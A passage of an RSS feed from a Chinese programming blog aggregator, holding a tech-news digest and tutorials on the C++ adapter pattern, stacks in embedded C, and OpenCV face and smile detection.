开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:54 +0000</pubDate>
    </item>
    <item>
      <title>10月18日，每日信息差</title>
      <link>https://www.ppmy.cn/news/1540351.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维10月18日，每日信息差news/2025/10/31 17:52:53/第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典，宣布成立其全资法人公司 —— 现代前瞻汽车技术开发（上海）有限公司。该中心是集团在海外建立的首个前瞻技术研发中心，专注于自动驾驶、智能座舱、共享出行等领域的研发。研发中心计划在上海静安寺设立 UX Studio，并在智能驾驶、AI 领域进行深入研究，同时推动 RoboTaxi 的示范运营。第二、Arm 正式加入 OpenCloudOS 操作系统开源社区，并签署 CLA，使其能够支持包括 Arm 架构在内的各类硬件平台。OpenCloudOS 是一个国产开源操作系统社区，已经适配了多种芯片和软硬件，装机量超过 1000 万节点，兼容适配 1300 余款国产软硬件及 5895 款开源软件。第三、Mozilla 的火狐 Firefox 浏览器最新 Nightly 版本开始原生支持微软的 Mica 材质，提供更加流畅和一致的视觉体验。用户可以通过操作步骤启用 Mica 材质，改善界面风格，特别是在深色模式下的效果。第四、广东省光伏产品首次采用铁路集装箱班列运输，由广铁集团积极落实国家 「双碳」 目标和西部大开发部署。广铁集团通过与工业和信息化厅、能源局等部门的对接，对 60 家光伏企业进行调研，了解光伏产供销和物流情况，并制定了针对性的物流措施。针对光伏产品特点，广深铁路物流中心为其定制了 「门到站」 的物流方案，保障运输安全和时效。此次铁路运输的成功，有助于降低企业物流成本，并将促进广东省制造业高质量发展。第五、国网电力工程研究院有限公司成立，由孟庆强担任法定代表人，注册资本 10 亿人民币。该公司由国家电网有限公司全资持股，经营范围包括电力设施安装、维修、试验，检验检测服务，以及人工智能应用软件开发等。第六、国家相关部委计划成立低空经济专管司局，该举措已获得批复，正处于筹备阶段。此举旨在适应新质生产力发展需求，更好地推动产业协同和资源整合。今日分享到此结束，感谢观看http://www.ppmy.cn/news/1540351.html相关文章23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:53 +0000</pubDate>
    </item>
    <item>
      <title>23种设计模式具体实现方法</title>
      <link>https://www.ppmy.cn/news/1540350.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维23种设计模式具体实现方法news/2025/10/31 17:52:52/提示：文章文章目录前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结三、3.1总结前言前期疑问：本文目标：一、背景最近二、设计模式1、代理模式参考的这篇文章，代理模式(Proxy)同时这篇文章还引用了另一篇文章，这篇文章使用了租客租房和中介的例子。设计模式之代理模式2、适配器模式这次狙击适配器模式看了这篇文章，感觉讲的还算容易理解C++设计模式-适配器模式文中描述了适配器的一个常规用法：举一个常用的场景：有一个设备管理类，可以动态增加和删除设备，并且还可以控制设备打开或者关闭，这个类实现之后，不用管设备具体类型，后期有新的奇奇怪怪的设备都可以兼容而不需要修改这个设备管理类的代码。/*** @brief 设备控制统一接口*/classDeviceControl{public:DeviceControl(){}virtual~DeviceControl(){}public:virtualvoidTurnOn()=0;// 统一的设备打开接口virtualvoidTurnOff()=0;// 统一的设备关闭接口};现在有一个电风扇设备，其接口假如是厂家提供的SDK，我们自己没法修改/*** @brief 风扇设备控制接口*/classFan{public:Fan(){}~Fan(){};public:voidOpen(){std::cout&lt;&lt;"open fan"&lt;&lt;std::endl;};voidClose(){std::cout&lt;&lt;"close fan"&lt;&lt;std::endl;};};还有一个电视机设备，其接口假如是厂家提供的SDK，我们自己没法修改/*** @brief 电视机设备控制接口*/classTV{public:TV(){}~TV(){};public:voidSwitch(boolvalue){if(value==true)std::cout&lt;&lt;"open tv"&lt;&lt;std::endl;elsestd::cout&lt;&lt;"close tv"&lt;&lt;std::endl;};};现在要通过设备控制统一接口去控制上面的风扇和电视机，就需要实现两个适配器风扇适配器：/*** @brief 风扇适配器*/classFanAdapter:publicDeviceControl{public:FanAdapter():fan_(std::make_shared&lt;Fan&gt;()){}virtual~FanAdapter()override{}public:voidTurnOn()override{fan_-&gt;Open();};// 风扇适配器中实际调用了风扇厂家提供的接口voidTurnOff()override{fan_-&gt;Close();};// 风扇适配器中实际调用了风扇厂家提供的接口private:std::shared_ptr&lt;Fan&gt;fan_;};电视机适配器：/*** @brief 电视机适配器*/classTVAdapter:publicDeviceControl{public:TVAdapter():tv_(std::make_shared&lt;TV&gt;()){}virtual~TVAdapter()override{}public:voidTurnOn()override{tv_-&gt;Switch(true);};// 电视机适配器中实际调用了电视机厂家提供的接口voidTurnOff()override{tv_-&gt;Switch(false);};// 电视机适配器中实际调用了电视机厂家提供的接口private:std::shared_ptr&lt;TV&gt;tv_;};客户端测试程序：// 客户端测试程序intmain(){std::vector&lt;std::shared_ptr&lt;DeviceControl&gt;&gt;devices;// 设备列表devices.emplace_back(std::make_shared&lt;FanAdapter&gt;());// 添加设备devices.emplace_back(std::make_shared&lt;TVAdapter&gt;());// 添加设备std::cout&lt;&lt;"open all devices"&lt;&lt;std::endl;for(constauto&amp;v:devices){v-&gt;TurnOn();}std::cout&lt;&lt;"close all devices"&lt;&lt;std::endl;for(constauto&amp;v:devices){v-&gt;TurnOff();}return0;}运行结果open all devices
open fan
open tv
close all devices
close fan
close tv在上面这个例子中，设备控制统一接口中，有设备打开和关闭两个统一接口，而风扇和电视机也有其打开和关闭的接口，不过他们的接口并不统一，电视机的打开和关闭甚至使用了同一个接口，通过传入不同参数来区分是打开还是关闭，而通过给每个设备实现一个适配器，这样就可以将他们的接口统一起来，如果后面还要控制更多的其他设备，只需要给每个设备都实现一个适配器即可，无需修改已有的代码，这也符合开闭原则。2.1 总结适配器模式的优点主要包括：（1）提高类的透明性和复用性： 适配器模式可以让类在现有的基础上进行复用，而不需要做出任何改变，这有助于避免大规模改写现有代码。（2）解耦目标类和适配器类： 通过使用适配器模式，目标类和适配器类可以实现解耦，从而提高程序的扩展性。这符合开闭原则，即对扩展开放，对修改关闭。（3）更好的扩展性： 在实现适配器功能的时候，可以调用自己开发的功能，从而自然地扩展系统的功能。（4）灵活性好： 适配器并没有影响原有功能，如果不想使用，可以直接删除。然而，适配器模式也存在一些缺点：（1）增加系统复杂性： 适配器编写过程需要全面考虑，可能会增加系统的复杂性。（2）降低代码可读性： 过多地使用适配器可能会使系统代码变得凌乱，增加代码阅读难度，降低代码可读性。比如，明明看到调用的是 A 接口，其实内部被适配成了 B 接口的实现，如果系统中有太多这种情况，可能会使系统难以理解和维护。三、3.1总结未完待续http://www.ppmy.cn/news/1540350.html相关文章嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:52 +0000</pubDate>
    </item>
    <item>
      <title>嵌入式数据结构中顺序栈用法</title>
      <link>https://www.ppmy.cn/news/1540349.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维嵌入式数据结构中顺序栈用法news/2025/10/31 17:52:51/第一：嵌入式C语言中栈特点栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。http://www.ppmy.cn/news/1540349.html相关文章机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:51 +0000</pubDate>
    </item>
    <item>
      <title>机器学习：opencv--人脸检测以及微笑检测</title>
      <link>https://www.ppmy.cn/news/1540348.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维机器学习：opencv--人脸检测以及微笑检测news/2025/10/31 17:52:50/目录前言一、人脸检测的原理1.特征提取2.分类器二、代码实现1.图片预处理2.加载分类器3.进行人脸识别4.标注人脸及显示三、微笑检测前言人脸检测是计算机视觉中的一个重要任务，旨在自动识别图像或视频中的人脸。它可以用于多种应用，如安全监控、身份验证、人机交互等。一、人脸检测的原理1.特征提取Haar特征：基于Haar小波变换，通过简单的矩形特征（如眼睛、鼻子、嘴巴的对比）来识别图像中的人脸。Haar特征计算速度快，适合实时应用。2.分类器这里使用的是python自带的库的分类器模型，是一种级联分类器分类器需要对图像的多个特征进行识别。例如，在识别一个动物是狗(正类)还是其他动物(负类)时，直接根据多个条件进行判断，流程是非常烦琐的。如果先判断该动物有几条腿。有四条腿的动物被判断为可能为狗，并对此范围内的对象继续进行分析和判断。没有四条腿的动物直接被否决，即不可能是狗。只通过比较腿的数目就能排除样本集中大量的负类(如鸡、鸭、鹅等不是狗的动物的实例)。级联分类器就是基于这种思路将多个简单的分类器按照一定的顺序级联而成的。二、代码实现1.图片预处理import cv2image = cv2.imread('quanjiafu2.jpg')
image = cv2.resize(image, None, fx=0.4, fy=0.4)
gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)2.加载分类器"""-----------------加载分类器----------------"""
faceCascade = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')3.进行人脸识别"""------------------- 分类器检测实现人脸识别--------------"""
# objects = cv2.CascadeClassifier,detectMultiscale( imagel, scaleFactor[,minNeighbors[,flags[,minsize[, maxsize]]]]])
# 其中，各个参数及返回值的含义如下:
# image:待检测图像，通常为灰度图像。
# scaleFactor:表示在前后两次相继扫描中搜索窗口的缩放比例。识别，扫描，按照不同比例来进行扫描
# minNeighbors:表示构成检测目标的相邻矩形的最小个数。在默认情况下，该参数的值为 3,
#           表示有 3 个以上的检测标记存在时才认为存在人脸。如果希望提高检测的准确率可以将该参数的值设置得更大。
#           但这样做可能会让一些人脸无法被检测到。
# flags: 该参数通常被省略。在使用低版本 OpencV(opencV 1.X 版本)时，该参数可能会被设置为
# CV_HAAR_DO_CANNY_PRUNING，表示使用 Canny 边缘检测器拒绝一些区域。
# minSize:目标的最小尺寸，小于这个尺寸的目标将被忽略。
# maxSize: 目标的最大尺寸，大于这个尺寸的目标将被忽略。通常情况下，将该可选参数省略即可
#           若 maxsize 和 minsize 大小一致，则表示仅在一个尺度上食找目标。
# objects: 返回值. 目标对象的矩形框向量组。该值是一组矩形信息.
#           包含每个检测到的人脸对应的矩形框的信息(x轴方向位置、y轴方向位置、宽度、高度)faces = faceCascade.detectMultiScale(gray, scaleFactor=1.05, minNeighbors=5, minSize=(8, 8))
print("发现{0}张人脸!".format(len(faces)))
print("其位置分别是:", faces)4.标注人脸及显示"""---------------标注人脸及显示------------------"""
for (x, y, w, h) in faces:cv2.rectangle(image, (x, y), (x + w, y + h), (0, 255, 0), 2)
cv2.imshow('result', image)
cv2.waitKey(0)
cv2.destroyAllWindows()输出：三、微笑检测微笑检测是在人脸检测的基础上进行的加载微笑检测分类器打开摄像头检测一帧图片进行人脸检测提取出每张人脸所在的矩形区域对该矩形区域进行微笑检测微笑时，在矩形框的左上角表上smile按下esc结束import cv2faceCascade = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')
smile = cv2.CascadeClassifier('haarcascade_smile.xml')cap = cv2.VideoCapture(0)
while True:ret, frame = cap.read()frame = cv2.flip(frame, 1)  # 图片翻转 水平翻转if not ret:breakgray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)faces = faceCascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=10, minSize=(5, 5))"""--------处理每张人脸-------"""for (x, y, w, h) in faces:cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 255, 0), 2)# 提取人脸所在区域 多通道形式# roiColorFace = frame[y:y+h,x:x+w]# 单通道形式roi_gray_face = gray[y:y + h, x:x + w]# 微笑检测smiles = smile.detectMultiScale(roi_gray_face, scaleFactor=1.5, minNeighbors=10, minSize=(50, 50))for (sx, sy, sw, sh) in smiles:cv2.putText(frame, "smile", (x, y), cv2.FONT_HERSHEY_COMPLEX_SMALL, 1, (0, 255, 255), 2)cv2.imshow('result', frame)a = cv2.waitKey(100)if a == 27:breakprint(frame.shape)
# 释放摄像头赟源
cap.release()
# 关闭所有openCV创建的窗口
cv2.destroyAllWindows()http://www.ppmy.cn/news/1540348.html相关文章基于Springboot+Vue的宠物管理系统（含源码数据库）1.开发环境 
开发系统:Windows10/11 架构模式:MVC/前后端分离 JDK版本: Java JDK1.8 开发工具:IDEA 数据库版本: mysql5.7或8.0 数据库可视化工具: navicat 服务器: SpringBoot自带 apache tomcat 主要技术: Java,Springboot,mybatis,mysql,vue 
2.视频演示地址 
3.功能 
这个系…阅读更多...如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
